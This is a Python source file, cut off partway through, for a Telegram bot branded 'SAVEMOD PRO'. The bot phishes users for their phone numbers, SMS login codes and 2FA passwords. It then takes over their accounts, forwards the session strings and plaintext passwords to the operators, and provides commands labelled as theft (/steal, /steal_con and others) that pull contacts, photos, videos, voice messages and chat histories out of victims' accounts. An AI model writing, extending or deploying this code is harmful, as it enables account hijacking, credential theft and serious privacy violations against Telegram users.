import asyncio
import sqlite3
import os
import sys
import shutil
import tempfile
import html
import logging
from datetime import datetime
from threading import Thread
from typing import Optional, Dict, List, Any, Tuple

from flask import Flask, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import UserStatusOnline, UserStatusOffline
from telethon.tl.functions.account import UpdateStatusRequest
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
import nest_asyncio
import pytz
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
nest_asyncio.apply()

API_ID = int(os.environ.get('API_ID', 0))
API_HASH = os.environ.get('API_HASH', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]
ENCRYPT_KEY = os.environ.get('ENCRYPT_KEY', Fernet.generate_key().decode())

if not API_ID or not API_HASH or not BOT_TOKEN:
    logger.error("Ошибка: Не заданы переменные окружения")
    sys.exit(1)

cipher = Fernet(ENCRYPT_KEY.encode())
logger.info(f"Администраторы: {ADMIN_IDS}")

VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
if not os.path.exists(VOLUME_PATH):
    VOLUME_PATH = '.'
    os.makedirs(VOLUME_PATH, exist_ok=True)

DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_sessions (
        user_id INTEGER PRIMARY KEY,
        session_string_encrypted TEXT,
        phone TEXT,
        two_fa_encrypted TEXT,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        is_active INTEGER DEFAULT 0,
        registered_at TEXT
    )
''')
try:
    cursor.execute('ALTER TABLE user_sessions ADD COLUMN registered_at TEXT')
except:
    pass

cursor.execute('''
    CREATE TABLE IF NOT EXISTS muted_users (
        user_id INTEGER,
        muted_by INTEGER,
        muted_at TEXT,
        PRIMARY KEY (user_id, muted_by)
    )
''')
cursor.execute('''
    CREATE TABLE IF NOT EXISTS saved_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_id INTEGER,
        msg_id INTEGER,
        sender_id INTEGER,
        text TEXT,
        date TEXT
    )
''')
conn.commit()

active_clients = {}
saved_messages = {}
temp_auth = {}
pending_2fa = {}
pending_chat_count = {}
current_active_user = None

bot = Bot(token=BOT_TOKEN, parse_mode='HTML')
dp = Dispatcher(bot)
tz = pytz.timezone('Europe/Saratov')

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_target_admin(target_id):
    return target_id in ADMIN_IDS

def escape_html(text):
    return html.escape(str(text))

def encrypt_data(data):
    if not data:
        return None
    return cipher.encrypt(data.encode()).decode()

def decrypt_data(data_enc):
    if not data_enc:
        return None
    return cipher.decrypt(data_enc.encode()).decode()

def get_active_client():
    global current_active_user
    if current_active_user and current_active_user in active_clients:
        return active_clients[current_active_user], current_active_user
    for uid, client in active_clients.items():
        if not is_target_admin(uid):
            current_active_user = uid
            return client, uid
    return None, None

async def resolve_entity(client, target):
    try:
        if target.isdigit():
            return await client.get_entity(int(target))
        return await client.get_entity(target)
    except:
        return None

async def send_to_admin(text):
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, text, parse_mode='HTML')
        except:
            pass

async def send_media_to_admin(file_path, caption, admin_id=None):
    targets = [admin_id] if admin_id else ADMIN_IDS
    for aid in targets:
        try:
            with open(file_path, 'rb') as f:
                await bot.send_document(aid, InputFile(f, filename=os.path.basename(file_path)), caption=caption)
        except:
            pass

def get_code_keyboard():
    kb = InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(InlineKeyboardButton(str(i), callback_data=f"code_digit_{i}"))
    kb.row(
        InlineKeyboardButton("0", callback_data="code_digit_0"),
        InlineKeyboardButton("⌫", callback_data="code_backspace"),
        InlineKeyboardButton("✅", callback_data="code_submit")
    )
    return kb

async def export_chat_to_html(client, chat_id, chat_name, me):
    messages = []
    async for msg in client.iter_messages(chat_id, limit=1000):
        if msg.text:
            try:
                if msg.out:
                    sender_name = f"{me.first_name} (Вы)"
                else:
                    sender = await client.get_entity(msg.sender_id)
                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
                dt = msg.date.astimezone(tz)
                time_str = dt.strftime('%H:%M')
                date_str = dt.strftime('%d.%m.%Y')
                text = escape_html(msg.text).replace('\n', '<br>')
                messages.append(f'<div class="msg"><div class="sender">{escape_html(sender_name)}</div><div class="time">{time_str} {date_str}</div><div class="text">{text}</div></div>')
            except:
                continue
    if not messages:
        return None
    messages.reverse()
    return f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Чат с {escape_html(chat_name)}</title>
<style>body{{font-family:Arial;background:#0e1621;color:#e1e8f0;padding:20px}}.container{{max-width:800px;margin:0 auto;background:#17212b;border-radius:10px;padding:20px}}.msg{{margin-bottom:15px;padding:10px;background:#2b3945;border-radius:10px}}.sender{{font-weight:bold}}.time{{font-size:10px;color:#6c7883}}.text{{font-size:14px;margin-top:5px}}</style>
</head><body><div class="container"><h2>Чат с {escape_html(chat_name)}</h2><p>Всего сообщений: {len(messages)}</p>{''.join(messages)}<p>📅 {datetime.now(tz).strftime('%d.%m.%Y %H:%M:%S')}</p></div></body></html>'''

async def steal_contacts(client, me):
    contacts = []
    async for dialog in client.iter_dialogs():
        if dialog.is_user and not getattr(dialog.entity, 'bot', False):
            name = f"{dialog.entity.first_name or ''} {dialog.entity.last_name or ''}".strip()
            uname = f"@{dialog.entity.username}" if dialog.entity.username else ""
            phone = getattr(dialog.entity, 'phone', '') or ''
            contacts.append(f"{name} {uname} 📞{phone} 🆔{dialog.entity.id}")
    if contacts:
        text = f"📒 КОНТАКТЫ {me.first_name} ({len(contacts)}):\n" + "\n".join(contacts[:100])
        await send_to_admin(text[:4000])

# ========== АДМИН КОМАНДЫ ==========

@dp.message_handler(commands=['spyhelp'])
async def cmd_spyhelp(message):
    if not is_admin(message.from_user.id):
        return
    await message.answer("""
🔰 <b>SAVEMOD - PRO VERSION</b>

<b>👥 АККАУНТЫ</b>
/users - список аккаунтов
/swap НОМЕР - переключить активный
/active - кто сейчас активен
/del_session НОМЕР - удалить сессию
/sessions - список сессий

<b>📒 КРАЖА КОНТАКТОВ</b>
/steal_con НОМЕР - выгрузить контакты с любого аккаунта

<b>🎬 КРАЖА МЕДИА (через активный аккаунт)</b>
/steal @username - всё (фото/видео/кружки/голосовые/стикеры/файлы)
/steal_photo @username - только фото
/steal_video @username - только видео

<b>💬 ДИАЛОГИ</b>
/chats - список диалогов
/chat ID - просмотр чата

<b>📊 ДРУГОЕ</b>
/status @username - статус
/online - кто в сети
/stats - статистика
/backup - бэкап БД

<b>🤖 ЮЗЕРБОТ (в ЛС через точку)</b>
.help .mute .unmute .list .spam .type .info .broadcast
""", parse_mode='HTML')

@dp.message_handler(commands=['users'])
async def cmd_users(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username, phone, is_active FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет аккаунтов")
        return
    out = "👥 <b>АККАУНТЫ</b>\n\n"
    i = 0
    for uid, fn, un, ph, act in rows:
        if is_target_admin(uid):
            continue
        i += 1
        name = fn or un or str(uid)
        actm = " ✅" if (act == 1 or uid == current_active_user) else ""
        out += f"<b>{i}. {name}</b>{actm}\n   🆔 <code>{uid}</code>\n   📱 {ph or '-'}\n\n"
        if len(out) > 3500:
            await message.answer(out, parse_mode='HTML')
            out = ""
    if out:
        await message.answer(out, parse_mode='HTML')

@dp.message_handler(commands=['sessions'])
async def cmd_sessions(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет сессий")
        return
    lst = []
    for uid, fn, un in rows:
        if is_target_admin(uid):
            continue
        name = fn or un or str(uid)
        st = "✅" if uid in active_clients else "❌"
        lst.append(f"{st} <code>{uid}</code> - {name}")
    await message.answer("📋 <b>СЕССИИ</b>\n\n" + "\n".join(lst), parse_mode='HTML')

@dp.message_handler(commands=['del_session'])
async def cmd_del_session(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /del_session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("❌ Неверный номер")
            return
        tid, fn, un = na[num]
        name = fn or un or str(tid)
        if tid in active_clients:
            try:
                await active_clients[tid].disconnect()
            except:
                pass
            del active_clients[tid]
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (tid,))
        cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (tid,))
        conn.commit()
        await message.answer(f"✅ Сессия {name} удалена")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['reset_me'])
async def cmd_reset_me(message):
    uid = message.from_user.id
    if uid in active_clients:
        try:
            await active_clients[uid].disconnect()
        except:
            pass
        del active_clients[uid]
    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (uid,))
    conn.commit()
    await message.answer("✅ Сессия удалена. Отправь /start")

@dp.message_handler(commands=['swap'])
async def cmd_swap(message):
    global current_active_user
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /swap НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("❌ Неверный номер")
            return
        user_id = na[num][0]
        name = na[num][1] or na[num][2] or str(user_id)
        if user_id not in active_clients:
            await message.answer(f"❌ Аккаунт {name} не запущен")
            return
        current_active_user = user_id
        cursor.execute('UPDATE user_sessions SET is_active=0')
        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
        conn.commit()
        me = await active_clients[user_id].get_me()
        await message.answer(f"✅ Переключился на {me.first_name}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['active'])
async def cmd_active(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        me = await cl.get_me()
        await message.answer(f"✅ Активный: {me.first_name}")
    except:
        await message.answer(f"✅ Активный ID: {uid}")

@dp.message_handler(commands=['steal_con'])
async def cmd_steal_contacts_by_number(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /steal_con НОМЕР_ИЗ_USERS\nПример: /steal_con 1")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, session_string_encrypted, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, ss_enc, fn, un) for uid, ss_enc, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("❌ Неверный номер")
            return
        target_uid, ss_enc, fn, un = na[num]
        
        temp_client = None
        if target_uid in active_clients:
            client = active_clients[target_uid]
        else:
            ss = decrypt_data(ss_enc)
            temp_client = TelegramClient(StringSession(ss), API_ID, API_HASH)
            await temp_client.connect()
            if not await temp_client.is_user_authorized():
                await message.answer("❌ Сессия умерла")
                return
            client = temp_client
        
        me = await client.get_me()
        await message.answer(f"🔄 Краду контакты с {me.first_name}...")
        
        contacts = []
        async for dialog in client.iter_dialogs():
            if dialog.is_user and not getattr(dialog.entity, 'bot', False):
                ent = dialog.entity
                name = f"{ent.first_name or ''} {ent.last_name or ''}".strip()
                uname = f"@{ent.username}" if ent.username else ""
                phone = getattr(ent, 'phone', '') or ''
                contacts.append(f"{name} {uname} 📞{phone} 🆔{ent.id}")
        
        if contacts:
            text = f"📒 КОНТАКТЫ {me.first_name} ({len(contacts)} шт):\n" + "\n".join(contacts[:150])
            await send_to_admin(text[:4000])
            
            if len(contacts) > 150:
                with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', encoding='utf-8', delete=False) as f:
                    f.write("\n".join(contacts))
                    path = f.name
                with open(path, 'rb') as f:
                    await bot.send_document(message.from_user.id, InputFile(f, filename=f"contacts_{me.first_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"), caption=f"📒 Полные контакты {me.first_name}")
                os.unlink(path)
            await message.answer(f"✅ Выгружено {len(contacts)} контактов")
        else:
            await message.answer("❌ Нет контактов")
        
        if temp_client:
            await temp_client.disconnect()
            
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['steal'])
async def cmd_steal_all_media_from_user(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /steal @username\nКрадет все медиа у пользователя через активный аккаунт")
        return
    
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта. Используй /swap")
        return
    
    target = args.strip()
    ent = await resolve_entity(cl, target)
    if not ent:
        await message.answer("❌ Пользователь не найден")
        return
    if ent.id == uid or is_target_admin(ent.id):
        await message.answer("❌ Нельзя красть у себя или админа")
        return
    
    target_name = ent.first_name or ent.username or str(ent.id)
    await message.answer(f"🔄 Кража ВСЕГО медиа у {target_name} (последние 500)...")
    
    media_by_type = {'photo': [], 'video': [], 'video_note': [], 'voice': [], 'sticker': [], 'document': []}
    
    async for msg in cl.iter_messages(ent.id, limit=500):
        if msg.photo:
            media_by_type['photo'].append(msg)
        elif msg.video:
            media_by_type['video'].append(msg)
        elif msg.video_note:
            media_by_type['video_note'].append(msg)
        elif msg.voice:
            media_by_type['voice'].append(msg)
        elif msg.sticker:
            media_by_type['sticker'].append(msg)
        elif msg.document:
            media_by_type['document'].append(msg)
    
    total = sum(len(v) for v in media_by_type.values())
    if total == 0:
        await message.answer(f"❌ У {target_name} нет медиа")
        return
    
    await message.answer(f"📦 Найдено: 📷{len(media_by_type['photo'])} 🎬{len(media_by_type['video'])} 🔄{len(media_by_type['video_note'])} 🎤{len(media_by_type['voice'])} 🎨{len(media_by_type['sticker'])} 📎{len(media_by_type['document'])}\nКачаю и отправляю...")
    
    for media_type, msgs in media_by_type.items():
        for msg in msgs:
            try:
                path = await msg.download_media()
                if path and os.path.exists(path):
                    ext_map = {'photo': '.jpg', 'video': '.mp4', 'video_note': '.mp4', 'voice': '.ogg', 'sticker': '.webp', 'document': None}
                    ext = ext_map.get(media_type, os.path.splitext(path)[1] or '.file')
                    safe_name = f"{target_name}_{media_type}_{msg.id}{ext}"
                    new_path = os.path.join(tempfile.gettempdir(), safe_name)
                    shutil.move(path, new_path)
                    
                    with open(new_path, 'rb') as f:
                        if media_type == 'voice':
                            await bot.send_voice(message.from_user.id, InputFile(f), caption=f"🎙 {target_name} | {msg.date.strftime('%d.%m %H:%M')}")
                        elif media_type == 'video_note':
                            await bot.send_video_note(message.from_user.id, InputFile(f))
                        else:
                            await bot.send_document(message.from_user.id, InputFile(f, filename=safe_name), caption=f"📎 {media_type} от {target_name} | {msg.date.strftime('%d.%m %H:%M')}")
                    
                    os.remove(new_path)
                    await asyncio.sleep(0.2)
            except Exception as e:
                logger.error(f"Ошибка {media_type}: {e}")
    
    await message.answer(f"✅ Готово. Украдено {total} файлов у {target_name}")

@dp.message_handler(commands=['steal_photo'])
async def cmd_steal_photo_only(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /steal_photo @username")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    target = args.strip()
    ent = await resolve_entity(cl, target)
    if not ent:
        await message.answer("❌ Не найден")
        return
    await message.answer(f"📷 Краду фото у {ent.first_name}...")
    count = 0
    async for msg in cl.iter_messages(ent.id, limit=500):
        if msg.photo:
            try:
                path = await msg.download_media()
                if path:
                    with open(path, 'rb') as f:
                        await bot.send_photo(message.from_user.id, InputFile(f), caption=f"📸 {ent.first_name} | {msg.date.strftime('%d.%m %H:%M')}")
                    os.remove(path)
                    count += 1
                    await asyncio.sleep(0.15)
            except:
                pass
    await message.answer(f"✅ Скачано {count} фото")

@dp.message_handler(commands=['steal_video'])
async def cmd_steal_video_only(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /steal_video @username")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    target = args.strip()
    ent = await resolve_entity(cl, target)
    if not ent:
        await message.answer("❌ Не найден")
        return
    await message.answer(f"🎬 Краду видео у {ent.first_name}...")
    count = 0
    async for msg in cl.iter_messages(ent.id, limit=500):
        if msg.video:
            try:
                path = await msg.download_media()
                if path:
                    with open(path, 'rb') as f:
                        await bot.send_video(message.from_user.id, InputFile(f), caption=f"🎬 {ent.first_name} | {msg.date.strftime('%d.%m %H:%M')}")
                    os.remove(path)
                    count += 1
                    await asyncio.sleep(0.2)
            except:
                pass
    await message.answer(f"✅ Скачано {count} видео")

@dp.message_handler(commands=['chats'])
async def cmd_chats(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    await message.answer("🔄 Собираю список диалогов...")
    chats = []
    async for dlg in cl.iter_dialogs():
        if dlg.is_user:
            try:
                ent = await cl.get_entity(dlg.id)
                if getattr(ent, 'bot', False) or ent.id == uid or is_target_admin(ent.id):
                    continue
                name = ent.first_name or ent.username or str(ent.id)
                chats.append({'id': ent.id, 'name': name})
            except:
                chats.append({'id': dlg.id, 'name': dlg.name or str(dlg.id)})
    if not chats:
        await message.answer("📭 Нет диалогов")
        return
    out = "📋 <b>ДИАЛОГИ</b>\n\n"
    for i, ch in enumerate(chats):
        out += f"{i+1}. {ch['name']}\n"
        if len(out) > 3500:
            await message.answer(out, parse_mode='HTML')
            out = ""
    if out:
        await message.answer(out, parse_mode='HTML')

@dp.message_handler(commands=['chat'])
async def cmd_chat(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /chat ID или @username")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        if args.isdigit():
            ent = await cl.get_entity(int(args))
        else:
            ent = await resolve_entity(cl, args)
        if not ent or ent.id == uid or is_target_admin(ent.id):
            await message.answer("❌ Пользователь не найден")
            return
        target_id = ent.id
        target_name = ent.first_name or ent.username or args
    except:
        await message.answer("❌ Ошибка")
        return
    pending_chat_count[message.from_user.id] = {'target_id': target_id, 'target_name': target_name}
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📝 Последние 30", callback_data=f"last_30_{target_id}_{target_name}"),
        InlineKeyboardButton("🔢 Своё кол-во", callback_data=f"custom_count_{target_id}_{target_name}"),
        InlineKeyboardButton("📄 Экспорт HTML", callback_data=f"html_{target_id}_{target_name}")
    )
    await message.answer(f"📱 <b>Чат с {target_name}</b>", parse_mode='HTML', reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data.startswith('custom_count_'))
async def custom_count(cb):
    if not is_admin(cb.from_user.id):
        await cb.answer("❌ Нет прав")
        return
    data = cb.data.replace('custom_count_', '').split('_', 1)
    target_id = int(data[0])
    target_name = data[1]
    pending_chat_count[cb.from_user.id] = {'target_id': target_id, 'target_name': target_name}
    await cb.message.answer("🔢 Введи количество сообщений (1-1000):")
    await cb.answer()

@dp.message_handler(lambda msg: msg.from_user.id in pending_chat_count)
async def handle_custom_count(message):
    user_id = message.from_user.id
    data = pending_chat_count[user_id]
    try:
        limit = min(int(message.text.strip()), 1000)
        if limit < 1:
            raise
    except:
        await message.answer("❌ Введи число")
        del pending_chat_count[user_id]
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        del pending_chat_count[user_id]
        return
    status = await message.answer(f"🔄 Загружаю последние {limit} сообщений...")
    msgs = []
    async for msg in cl.iter_messages(data['target_id'], limit=limit):
        if msg.text:
            try:
                sn = "👉 Я" if msg.out else (await cl.get_entity(msg.sender_id)).first_name or str(msg.sender_id)
                if is_target_admin(msg.sender_id if not msg.out else 0):
                    continue
                dt = msg.date.strftime('%d.%m %H:%M')
                msgs.append(f"[{dt}] {sn}: {msg.text[:200]}")
            except:
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:200]}")
    await status.delete()
    if msgs:
        response = f"💬 <b>ЧАТ С {data['target_name']}</b>\n\n" + "\n".join(reversed(msgs))
        if len(response) > 4000:
            for i in range(0, len(msgs), 20):
                await message.answer("\n".join(reversed(msgs[i:i+20])), parse_mode='HTML')
        else:
            await message.answer(response, parse_mode='HTML')
    else:
        await message.answer("📭 Нет сообщений")
    del pending_chat_count[user_id]

@dp.callback_query_handler(lambda c: c.data.startswith('last_30_'))
async def show_last_30(cb):
    if not is_admin(cb.from_user.id):
        return
    data = cb.data.replace('last_30_', '').split('_', 1)
    target_id = int(data[0])
    target_name = data[1]
    cl, uid = get_active_client()
    if not cl:
        await cb.message.answer("❌ Нет активного аккаунта")
        return
    await cb.answer("Загружаю...")
    msgs = []
    async for msg in cl.iter_messages(target_id, limit=30):
        if msg.text:
            try:
                sn = "👉 Я" if msg.out else (await cl.get_entity(msg.sender_id)).first_name or str(msg.sender_id)
                if is_target_admin(msg.sender_id if not msg.out else 0):
                    continue
                dt = msg.date.strftime('%d.%m %H:%M')
                msgs.append(f"[{dt}] {sn}: {msg.text[:200]}")
            except:
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:200]}")
    if msgs:
        await cb.message.answer("💬 <b>" + target_name + "</b>\n\n" + "\n".join(reversed(msgs)), parse_mode='HTML')
    else:
        await cb.message.answer("📭 Нет сообщений")

@dp.callback_query_handler(lambda c: c.data.startswith('html_'))
async def export_html(cb):
    if not is_admin(cb.from_user.id):
        return
    data = cb.data.replace('html_', '').split('_', 1)
    target_id = int(data[0])
    target_name = data[1]
    cl, uid = get_active_client()
    if not cl:
        await cb.message.answer("❌ Нет активного аккаунта")
        return
    await cb.answer("Экспортирую...")
    try:
        me = await cl.get_me()
        html_content = await export_chat_to_html(cl, target_id, target_name, me)
        if not html_content:
            await cb.message.answer("❌ Нет текстовых сообщений")
            return
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(html_content)
            path = f.name
        with open(path, 'rb') as f:
            await bot.send_document(cb.from_user.id, InputFile(f, filename=f"chat_{target_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"), caption=f"📁 Чат с {target_name}")
        os.unlink(path)
    except Exception as e:
        await cb.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['status'])
async def cmd_status(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /status @username")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    ent = await resolve_entity(cl, args)
    if not ent:
        await message.answer("❌ Не найден")
        return
    st = "🟢 В сети" if isinstance(ent.status, UserStatusOnline) else "⚫ Не в сети" if isinstance(ent.status, UserStatusOffline) else "⚪ Скрыт"
    await message.answer(f"👤 {ent.first_name}\n🆔 {ent.id}\n📊 {st}")

@dp.message_handler(commands=['online'])
async def cmd_online(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    online = []
    async for dlg in cl.iter_dialogs():
        if dlg.is_user:
            try:
                ent = await cl.get_entity(dlg.id)
                if not getattr(ent, 'bot', False) and isinstance(ent.status, UserStatusOnline):
                    online.append(dlg.name)
            except:
                pass
    if online:
        await message.answer(f"🟢 <b>В СЕТИ ({len(online)})</b>:\n" + "\n".join(online[:20]), parse_mode='HTML')
    else:
        await message.answer("🟢 Никого")

@dp.message_handler(commands=['stats'])
async def cmd_stats(message):
    if not is_admin(message.from_user.id):
        return
    acc = cursor.execute('SELECT COUNT(*) FROM user_sessions').fetchone()[0]
    await message.answer(f"📊 <b>СТАТИСТИКА</b>\n\n👥 Аккаунтов: {acc}\n🟢 Активных: {len(active_clients)}", parse_mode='HTML')

@dp.message_handler(commands=['backup'])
async def cmd_backup(message):
    if not is_admin(message.from_user.id):
        return
    st = await message.answer("💾 Создаю бэкап...")
    bp = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
    shutil.copy2(DB_PATH, bp)
    with open(bp, 'rb') as f:
        for aid in ADMIN_IDS:
            try:
                await bot.send_document(aid, InputFile(f, filename=os.path.basename(bp)), caption="💾 Бэкап БД")
                await f.seek(0)
            except:
                pass
    os.remove(bp)
    await st.edit_text("✅ Бэкап отправлен")

# ========== РЕГИСТРАЦИЯ ==========

@dp.message_handler(commands=['start'])
async def cmd_start(message):
    uid = message.from_user.id
    cursor.execute('SELECT session_string_encrypted FROM user_sessions WHERE user_id=?', (uid,))
    row = cursor.fetchone()
    if row and row[0]:
        await message.answer("✅ <b>SAVEMOD PRO</b> активен!\n/spyhelp - команды", parse_mode='HTML')
        if uid not in active_clients:
            ss = decrypt_data(row[0])
            asyncio.create_task(run_userbot(uid, ss))
        return
    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 <b>SAVEMOD PRO</b>\nОтправь номер телефона", parse_mode='HTML', reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def handle_contact(message):
    uid = message.from_user.id
    phone = message.contact.phone_number
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        res = await client.send_code_request(phone)
        temp_auth[uid] = {'client': client, 'phone': phone, 'hash': res.phone_code_hash, 'code': ''}
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
async def handle_code(cb):
    uid = cb.from_user.id
    if uid not in temp_auth:
        await cb.answer("Сессия истекла, /start")
        return
    act = cb.data.replace('code_', '')
    cur = temp_auth[uid].get('code', '')
    if act.startswith('digit_'):
        d = act.split('_')[1]
        if len(cur) < 5:
            temp_auth[uid]['code'] = cur + d
    elif act == 'backspace':
        temp_auth[uid]['code'] = cur[:-1]
    elif act == 'submit':
        if len(cur) == 5:
            await cb.answer("Авторизация...")
            await complete_auth(cb, uid)
            return
        else:
            await cb.answer("Нужно 5 цифр", show_alert=True)
            return
    code = temp_auth[uid]['code']
    disp = code if code else "_____"
    await cb.message.edit_text(f"📱 Код: {disp}", reply_markup=get_code_keyboard())
    await cb.answer()

async def complete_auth(cb, uid):
    data = temp_auth[uid]
    try:
        await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
        ss = data['client'].session.save()
        me = await data['client'].get_me()
        ss_enc = encrypt_data(ss)
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string_encrypted, phone, two_fa_encrypted, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (uid, ss_enc, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await cb.message.answer(f"✅ <b>SAVEMOD PRO</b> активирован!\n👤 {me.first_name}\n\n📌 .help в ЛС с собой", parse_mode='HTML')
        await send_to_admin(f"🔐 НОВАЯ СЕССИЯ: {me.first_name}\n📱 {data['phone']}\n🔑 Строка: {ss}")
        asyncio.create_task(run_userbot(uid, ss))
        await data['client'].disconnect()
        del temp_auth[uid]
    except Exception as e:
        if '2fa' in str(e).lower() or 'password' in str(e).lower():
            await cb.message.answer("🔐 Введи облачный пароль (2FA):")
            pending_2fa[uid] = data
            del temp_auth[uid]
        else:
            await cb.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
async def handle_2fa(message):
    uid = message.from_user.id
    data = pending_2fa[uid]
    try:
        await data['client'].sign_in(password=message.text.strip())
        ss = data['client'].session.save()
        me = await data['client'].get_me()
        ss_enc = encrypt_data(ss)
        two_fa_enc = encrypt_data(message.text.strip())
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string_encrypted, phone, two_fa_encrypted, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (uid, ss_enc, data['phone'], two_fa_enc, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await message.answer(f"✅ <b>SAVEMOD PRO</b> активирован с 2FA!\n👤 {me.first_name}", parse_mode='HTML')
        await send_to_admin(f"🔐 НОВАЯ СЕССИЯ (2FA): {me.first_name}\n📱 {data['phone']}\n🔑 Строка: {ss}\n🔒 2FA пароль: {message.text.strip()}")
        asyncio.create_task(run_userbot(uid, ss))
        await data['client'].disconnect()
        del pending_2fa[uid]
    except Exception as e:
        await message.answer(f"❌ Ошибка 2FA: {e}")

# ========== ЮЗЕРБОТ ==========

async def run_userbot(owner_id, session_string):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
